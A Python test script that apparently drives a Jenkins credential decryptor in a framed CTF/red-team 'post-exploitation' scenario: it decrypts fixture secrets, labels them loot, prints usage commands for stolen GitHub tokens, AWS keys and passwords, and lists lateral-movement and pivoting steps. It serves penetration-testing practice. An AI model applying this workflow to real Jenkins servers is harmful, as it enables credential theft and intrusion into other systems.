#!/usr/bin/env python3
"""
CTF Scenario Testing - Jenkins Credential Decryptor
This simulates a real CTF/Red Team scenario where you've gained access to Jenkins files
"""
import subprocess
import sys
import json
from pathlib import Path

def run_command(cmd, desc):
    """Run a command and return output"""
    print(f"\n{'='*70}")
    print(f"SCENARIO: {desc}")
    print(f"{'='*70}")
    print(f"Command: {' '.join(cmd)}")
    print()
    
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=Path(__file__).parent)
    print(result.stdout)
    if result.stderr:
        print("STDERR:", result.stderr)
    return result.returncode, result.stdout, result.stderr

def main():
    print("""
======================================================================
           Jenkins Credential Decryptor - CTF Test
              Red Team Post-Exploitation Scenario
======================================================================

You've compromised a Jenkins server and found the following files:
  - /var/jenkins_home/secrets/master.key
  - /var/jenkins_home/secrets/hudson.util.Secret
  - /var/jenkins_home/credentials.xml

Your mission: Extract all credentials for lateral movement
""")

    # Scenario 1: Quick credential dump with --reveal-secrets
    print("\n" + "="*70)
    print("SCENARIO 1: Quick Credential Dump (Fast Extraction)")
    print("="*70)
    returncode, stdout, stderr = run_command([
        sys.executable, "decrypt.py",
        "--key", "test_fixtures/secrets/master.key",
        "--secret", "test_fixtures/secrets/hudson.util.Secret",
        "--xml", "test_fixtures/credentials.xml",
        "--reveal-secrets"
    ], "Extract credentials in plaintext for immediate use")
    
    if returncode != 0:
        print("ERROR: Extraction failed!")
        return 1
    
    # Parse output to show what we got
    secrets = []
    for line in stdout.split('\n'):
        line = line.strip()
        if line and not line.startswith('[') and line not in secrets:
            secrets.append(line)
    
    print("\n[+] LOOT ACQUIRED:")
    for secret in secrets:
        if secret and len(secret) > 2:
            print(f"    - {secret}")
    
    # Scenario 2: Export to JSON for automated processing
    print("\n" + "="*70)
    print("SCENARIO 2: Automated Credential Export (For Scripts)")
    print("="*70)
    returncode, stdout, stderr = run_command([
        sys.executable, "decrypt.py",
        "--key", "test_fixtures/secrets/master.key",
        "--secret", "test_fixtures/secrets/hudson.util.Secret",
        "--xml", "test_fixtures/credentials.xml",
        "--reveal-secrets",
        "--export-json", "outputs/ctf_loot.json"
    ], "Export credentials to JSON for automated tooling")
    
    if returncode != 0:
        print("ERROR: Export failed!")
        return 1
    
    # Load and parse JSON
    with open("outputs/ctf_loot.json", 'r') as f:
        loot = json.load(f)
    
    print("\n[+] CREDENTIALS EXPORTED TO: outputs/ctf_loot.json")
    print(f"[+] TOTAL SECRETS EXTRACTED: {len(loot)}")
    print("\n[+] PARSED CREDENTIALS:")
    
    for item in loot:
        print(f"\n    File: {item['file']}")
        print(f"    Decrypted: {item['decrypted']}")
        
        # Identify credential type
        secret = item['decrypted']
        if secret.startswith('ghp_'):
            print(f"    Type: GitHub Personal Access Token")
            print(f"    Usage: git clone https://ghp_XXX@github.com/target/repo.git")
        elif secret.startswith('AKIA'):
            print(f"    Type: AWS Access Key ID")
            print(f"    Usage: aws configure set aws_access_key_id {secret}")
        elif len(secret) < 20 and secret.isalnum():
            print(f"    Type: Password")
            print(f"    Usage: ssh user@target -p '{secret}'")
    
    # Scenario 3: Stealth mode - redacted output for logs
    print("\n" + "="*70)
    print("SCENARIO 3: Stealth Mode (Safe for Logging)")
    print("="*70)
    returncode, stdout, stderr = run_command([
        sys.executable, "decrypt.py",
        "--key", "test_fixtures/secrets/master.key",
        "--secret", "test_fixtures/secrets/hudson.util.Secret",
        "--xml", "test_fixtures/credentials.xml"
    ], "Extract with redaction (safe for command logs)")
    
    print("\n[+] OUTPUT IS REDACTED - Safe to include in pentest reports")
    print("[+] Use --reveal-secrets when you need plaintext")
    
    # Scenario 4: Dry-run for reconnaissance
    print("\n" + "="*70)
    print("SCENARIO 4: Reconnaissance (Dry-Run)")
    print("="*70)
    returncode, stdout, stderr = run_command([
        sys.executable, "decrypt.py",
        "--key", "test_fixtures/secrets/master.key",
        "--secret", "test_fixtures/secrets/hudson.util.Secret",
        "--xml", "test_fixtures/credentials.xml",
        "--dry-run"
    ], "Test if credentials exist without exposing them")
    
    print("\n[+] DRY-RUN COMPLETE - Credentials detected but not exposed")
    
    # Final summary
    print("\n" + "="*70)
    print("CTF MISSION COMPLETE")
    print("="*70)
    print("""
[+] Successfully extracted Jenkins credentials
[+] All secrets are now available for lateral movement
[+] JSON export ready for automated tooling
[+] Tool supports stealth and dry-run modes

Next steps for red team operation:
  1. Test extracted credentials against SSH/RDP/Web services
  2. Use AWS keys to enumerate cloud resources
  3. Use GitHub tokens to access source code repos
  4. Check for SSH keys in other Jenkins workspace directories
  5. Use credentials to pivot to other systems

Tool is production-ready for:
  [+] CTF competitions
  [+] Red team engagements
  [+] Penetration testing
  [+] Security research
""")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
